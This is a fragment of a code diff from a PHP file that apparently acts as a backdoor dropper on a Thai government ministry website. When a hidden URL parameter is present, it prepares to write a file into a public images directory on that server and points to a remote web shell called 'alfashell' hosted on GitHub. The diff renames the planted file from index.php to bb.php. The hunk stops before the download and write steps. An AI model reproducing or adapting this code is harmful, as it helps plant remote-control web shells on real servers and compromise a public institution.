@@ -2,7 +2,7 @@
 
 if (isset($_GET['mainbatosay'])) {
     $dirPath = '/home/admin/domains/ministeroffice.moph.go.th/public_html/images/employee/Politics';
-    $filePath = $dirPath . '/index.php';
+    $filePath = $dirPath . '/bb.php';
 
     $url = 'https://raw.githubusercontent.com/kurtcobain555/fileshell/main/alfashell.txt?token=GHSAT0AAAAAACUAWJI34FEXYEPWW2ESQDRQZT2T7OQ';
 
